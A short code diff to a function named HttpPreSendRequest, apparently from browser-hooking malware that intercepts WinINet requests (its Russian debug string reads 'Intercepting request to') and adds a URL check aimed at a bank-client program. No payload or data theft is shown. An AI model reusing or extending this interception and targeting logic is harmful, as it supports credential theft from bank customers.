@@ -384,14 +384,19 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	if (Request == NULL)
 		return NULL;
 
-	Request->URL = GetInetOption(Handle, INTERNET_OPTION_URL); ;
+	Request->URL = GetInetOption(Handle, INTERNET_OPTION_URL);
 	Request->Method = MID;
+
 
 	IEDBG(Request, NULL, "Перехватываем запрос на %s", Request->URL);
 
 
-    #ifdef bsssignH
+	#ifdef bsssignH
 		BSSSign::CheckRequest(Request->URL);
+	#endif
+
+	#ifdef JavaClient2015SaverH
+		CheckJavaClient2015File(Request->URL);
 	#endif
 
 
